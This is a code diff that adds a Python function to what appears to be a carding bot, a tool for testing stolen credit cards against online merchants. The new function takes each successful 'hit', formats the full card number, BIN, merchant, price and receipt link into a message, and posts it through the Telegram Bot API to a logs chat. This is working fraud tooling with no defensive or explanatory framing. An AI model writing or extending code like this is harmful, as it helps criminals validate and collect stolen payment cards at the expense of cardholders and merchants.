@@ -178,6 +178,33 @@ Country: {country} - {flag} - {currency}
         await error_log(traceback.format_exc())
 
 
+async def forward_hit_resp(fullcc, response, merchant, price, receipt, bin_str=None):
+    try:
+        import httpx
+        import urllib.parse
+        import json
+        session = httpx.AsyncClient(timeout=30)
+
+        bin_line = f"\n𝐁𝐈𝐍- <code>{bin_str}</code>" if bin_str else ""
+        url_line = f"\n𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐔𝐑𝐋- {receipt}" if receipt and receipt != "N/A" else ""
+
+        resp = f"""<b>Hɪᴛ Sᴜᴄᴄᴇss ✅
+
+𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭- {merchant}
+𝐏𝐫𝐢𝐜𝐞- {price}
+𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞- ⤿ {response} ⤾
+𝗖𝗮𝗿𝗱- <code>{fullcc}</code>{bin_line}{url_line}
+</b>"""
+        resp = urllib.parse.quote_plus(resp)
+        BOT_TOKEN = json.loads(open("FILES/config.json", "r", encoding="utf-8").read())["BOT_TOKEN"]
+        LOGS_CHAT = json.loads(open("FILES/config.json", "r", encoding="utf-8").read())["LOGS_CHAT"]
+        await session.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={LOGS_CHAT}&text={resp}&parse_mode=HTML")
+        await session.aclose()
+    except:
+        import traceback
+        await error_log(traceback.format_exc())
+
+
 DEBUG_CHAT = "-1003771046807"
 
 
